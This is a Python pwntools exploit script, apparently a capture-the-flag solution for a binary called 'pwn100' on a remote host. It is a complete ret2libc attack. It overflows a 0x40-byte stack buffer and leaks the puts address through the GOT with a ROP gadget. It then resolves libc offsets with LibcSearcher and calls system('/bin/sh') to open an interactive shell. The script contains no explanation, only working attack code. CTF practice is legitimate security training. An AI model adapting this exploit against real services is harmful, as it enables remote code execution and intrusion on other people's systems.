from pwn import *
from LibcSearcher import LibcSearcher

# p = process("./pwn100")
p = remote("111.198.29.45" , 30885)
elf = ELF("./pwn100")

pop_rdi_ret = 0x400763
vuln = 0x40068E

payload1 = "a" * 0x40 + "b" * 0x8
payload1 += p64(pop_rdi_ret) + p64(elf.got["puts"]) + p64(elf.plt["puts"])
payload1 += p64(vuln)
payload1 = payload1.ljust(0xc8 , "a")

p.send(payload1)
p.recvuntil("bye~\n")
puts_addr = u64(p.recvuntil("\n" , drop = True)[:6].ljust(8 , "\x00"))
log.info(hex(puts_addr))

libc = LibcSearcher("puts" , puts_addr)
libc_base = puts_addr - libc.dump("puts")
system = libc_base + libc.dump("system")
str_bin_sh = libc_base + libc.dump("str_bin_sh")

payload2 = "a" * 0x40 + "b" * 0x8
payload2 += p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system)
payload2 = payload2.ljust(0xc8 , "a")

p.send(payload2)
p.recvuntil("bye~\n")
p.interactive()